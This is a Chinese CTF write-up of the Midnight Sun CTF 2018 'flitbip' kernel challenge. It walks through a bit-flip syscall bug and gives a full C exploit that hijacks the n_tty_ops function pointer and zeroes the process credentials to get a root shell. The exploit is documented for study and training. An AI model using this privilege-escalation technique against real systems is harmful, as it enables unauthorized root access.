# Linux内核pwn——劫持n_tty_ops指针

阅读量 **356781**

|评论 **1**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2019-03-08 10:30:33

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p5.ssl.qhimg.com/t01888451968984a576.jpg)

## 0x001 前言

以往多数的kernel pwn题都是基于内核扩展模块的漏洞分析，今天我们来看2018年Midnight Sun CTF一个无*.ko内核模块的题。

题目下载：

链接:<https://pan.baidu.com/s/1_DcmU8JzseiiOA7mkYQu8Q> 密码:kfc8

## 0x002 干掉定时logout

由于内核运行一断时间后便会退出，需要解开文件系统，做一定修改

    
    
    mkdir core
    mv ./core.cpio ./core/
    cd core
    cpio -idmv < initrd
    rm initrd
    

一般的，我们会去看`init`文件，但貌似并没有问题

![](https://p0.ssl.qhimg.com/t013a980979a8ee64e2.png)

最后，我找到了`/home/flitbip`下的`.profile`文件，将第1、2行注释掉

![](https://p0.ssl.qhimg.com/t0118e38c33f1e89dc1.png)

为了后续调试方便，我在根目录新建一个`tmp`文件夹，在`init`作如下改动，让启动的内核具有root权限

![](https://p0.ssl.qhimg.com/t013793c2f6872c9f20.png)

重新打包

    
    
    find . -print0 | cpio --null -ov --format=newc > core.cpio
    mv ./core.cpio ..
    rm -rf ../core
    

## 0x003 分析

由init看得出来，内核启动过程并未加载任何与题目相关的内核扩展模块，但`src`目录下有一个`flitbip.c`文件

![](https://p4.ssl.qhimg.com/t01d096713b9944c3cd.png)

这里定义了一个系统调用(系统调用号为`333`)，会将参数`addr`的第`bit`位翻转

留意到`flit_cout`必须要小于`MAXFLIT = 1`，否则便会退出

![](https://p3.ssl.qhimg.com/t015e1210e59eaacc84.png)

绕过方法：

`flit_cout`是有符号长整型，调用一次系统调用`flitbip`，将`flit_cout`最高位翻转，此时`flit_cout`为负数。

    
    
    long flitbip(long *addr, long bit)
    {
        __asm__("mov rax, 333;"
                "syscall;"
        );
    }
    
    int main()
    {
        ...
        flitbip(flit_count, 63);
        ...
    }
    

先调试看看是否已经绕过，用`extract-vmlinux`提取内核执行文件

![](https://p0.ssl.qhimg.com/t01c34626eb6c06d2e6.png)

当我看到这样的情况，我是一脸懵逼的

![](https://p1.ssl.qhimg.com/t019d03efccd85af432.jpg)

估计是generic版的内核，好吧…只能去`/proc/kallsyms`找了

    
    
    /tmp # cat /proc/kallsyms | grep flit_count
    ffffffff818f4f78 B flit_count
    

EXP执行前

![](https://p3.ssl.qhimg.com/t019f16a1a0cb2f2e73.png)

EXP执行后，看样子`flit_count`翻转成负数了

![](https://p5.ssl.qhimg.com/t017a67668871d12b42.png)

下面考虑如何提权：

内核中存在`n_tty_ops`这个全局指针，其指向的这片地存储着许多函数指针，我们想办法将该处的函数指针改成我们`root`函数的地址，再触发该函数。

![](https://p5.ssl.qhimg.com/t01b127479968bd0d04.png)

`n_tty_ops`指向的函数指针

![](https://p5.ssl.qhimg.com/t011eab313c854d375e.png)

最后，我们利用含有漏洞333号系统调用，将`n_tty_read`劫持成`root`函数提权，`n_tty_read`存储在`*n_tty_ops +
0x30`

## 0x004 ROOT

由于没有开aslr，直接将`n_tty_ops`等地址写死即可

完整的EXP

    
    
    // gcc solved.c -static -masm=intel -g -o solved
    #include <stdio.h>
    #include <stdlib.h>
    
    unsigned long *flit_count = 0xffffffff818f4f78;
    unsigned long *n_tty_read = 0xffffffff810c8510;
    unsigned long *n_tty_ops = 0xffffffff8183e320;
    unsigned long *current_task = 0xffffffff8182e040;
    
    unsigned long user_cs, user_ss, user_rflags, user_sp;
    
    void save_status()
    {
        __asm__("mov %0, cs;"
                "mov %1, ss;"
                "mov %2, rsp;"
                "pushfq;"
                "popq %3;"
                :"=r"(user_cs),"=r"(user_ss),"=r"(user_sp),"=r"(user_rflags)
                :
                :"memory"
        );
        puts("[*]status has been saved.");
    }
    
    void binsh()
    {
        if(!getuid())
        {
            system("/bin/sh");
        }
        else
        {
            puts("[*]spawn shell error!");
        }
        exit(0);
    }
    
    long flitbip(long *addr, long bit)
    {
        __asm__("mov rax, 333;"
                "syscall;"
        );
    }
    
    void root()
    {
        int *cred = *(unsigned long *)((char *)*current_task + 0x3c0);
        for(int i = 1; i < 9; i++)
            cred[i] = 0;
    
        *(unsigned long *)((char *)n_tty_ops + 0x30) = (unsigned long)n_tty_read;
    
        __asm__("swapgs;"
                "mov rax, %0;"
                "push rax;"
                "mov rax, %1;"
                "push rax;"
                "mov rax, %2;"
                "push rax;"
                "mov rax, %3;"
                "push rax;"
                "mov rax, %4;"
                "push rax;"
                "iretq;"
                :
                :"r"(user_ss),"r"(user_sp),"r"(user_rflags),"r"(user_cs),"r"(binsh)
                :"memory"
        );
    }
    
    int main()
    {
        save_status();
        printf("user_sp addr: %pn", user_sp);
    
        flitbip(flit_count, 63);
    
        unsigned long xor = (unsigned long)root ^ (unsigned long)n_tty_read;
        printf("root addr: %lxn", root);
        printf("root xor: %lxn", xor);
        for(unsigned long i = 0; i < 64; i++)
        {
            if(xor & (1ULL << (i)))
                flitbip((char *)n_tty_ops + 0x30, i);
        }
    
        scanf("%c", user_sp);
        while(1);
    
        return 0;
    }
    

root~

![](https://p3.ssl.qhimg.com/t01bc90554d0e5ece92.png)

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **wooy0ung** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/172250](/post/id/172250)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [Pwn](/tag/Pwn)
  * [CTF](/tag/CTF)

 **+1** __3赞

 __收藏

![](https://p1.ssl.qhimg.com/t0131de115972950e64.png) wooy0ung

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

